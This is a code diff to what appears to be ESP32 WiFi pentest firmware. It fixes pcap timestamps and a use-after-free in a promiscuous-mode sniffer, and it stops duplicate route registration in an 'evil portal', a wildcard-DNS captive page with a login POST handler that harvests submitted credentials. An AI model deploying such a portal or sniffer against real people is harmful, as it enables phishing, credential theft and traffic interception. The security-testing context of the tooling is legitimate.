@@ -30,6 +30,7 @@
 #include <WebServer.h>
 #include <SD.h>
 #include <SPI.h>
+#include <sys/time.h>   // gettimeofday() para timestamp de epoch no .pcap
 #include <vector>
 
 // Driver WiFi de baixo nivel do ESP-IDF (promiscuidade + injecao de quadros).
@@ -125,12 +126,18 @@ void snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
         uint16_t len = p->rx_ctrl.sig_len;
         if (len > SNAP_LEN) len = SNAP_LEN;
         slot.len = len;
-        uint32_t us = micros();
-        slot.tsSec  = us / 1000000UL;
-        slot.tsUsec = us % 1000000UL;
+        // Timestamp de epoch real via gettimeofday(): se houve sync NTP
+        // (core/time_service) o relogio do sistema esta setado e o .pcap sai
+        // com horario absoluto. Sem NTP, e' tempo desde o boot (relativo),
+        // mas NUNCA envelopa como micros() (que estoura em ~71min de uptime).
+        struct timeval tv;
+        gettimeofday(&tv, nullptr);
+        slot.tsSec  = (uint32_t)tv.tv_sec;
+        slot.tsUsec = (uint32_t)tv.tv_usec;
         memcpy(slot.data, p->payload, len);
-        // Sem bloquear: se a fila encher, o pacote e descartado.
-        xQueueSendFromISR(g_pktQueue, &slot, nullptr);
+        // O callback roda na task do WiFi (nao em ISR): usa xQueueSend comum.
+        // Sem bloquear (timeout 0): se a fila encher, o pacote e descartado.
+        xQueueSend(g_pktQueue, &slot, 0);
     }
 }
 
@@ -264,8 +271,15 @@ void appSniffer() {
     // Encerra promiscuidade e libera recursos.
     esp_wifi_set_promiscuous(false);
     if (pcap) { pcap.flush(); pcap.close(); }
-    if (g_pktQueue) { vQueueDelete(g_pktQueue); g_pktQueue = nullptr; }
+    // Desarma o guardiao ANTES de destruir a fila para evitar use-after-free:
+    // zera g_logSd e o ponteiro global (o callback so toca a fila com ambos
+    // validos), da uma pequena barreira para qualquer callback em voo terminar
+    // e so entao libera a fila local.
     g_logSd = false;
+    QueueHandle_t q = g_pktQueue;
+    g_pktQueue = nullptr;
+    delay(20);   // barreira: deixa um callback ja iniciado concluir
+    if (q) vQueueDelete(q);
     WiFi.mode(WIFI_OFF);
 
     ui::messageBox("Sniffer",
@@ -516,9 +530,15 @@ void appEvilPortal() {
     g_dns.start(53, "*", ip);
 
     // Rotas do WebServer: raiz + login + qualquer outra (captive detection).
-    g_web.on("/login", HTTP_POST, portalLogin);
-    g_web.onNotFound(portalRoot);   // qualquer URL cai no portal
-    g_web.on("/", portalRoot);
+    // Registradas UMA UNICA VEZ: g_web.on()/onNotFound() empilham handlers numa
+    // lista ligada no heap; re-registrar a cada entrada no app vazaria memoria.
+    static bool rotasRegistradas = false;
+    if (!rotasRegistradas) {
+        g_web.on("/login", HTTP_POST, portalLogin);
+        g_web.onNotFound(portalRoot);   // qualquer URL cai no portal
+        g_web.on("/", portalRoot);
+        rotasRegistradas = true;
+    }
     g_web.begin();
 
     uint32_t ultimoDesenho = 0;
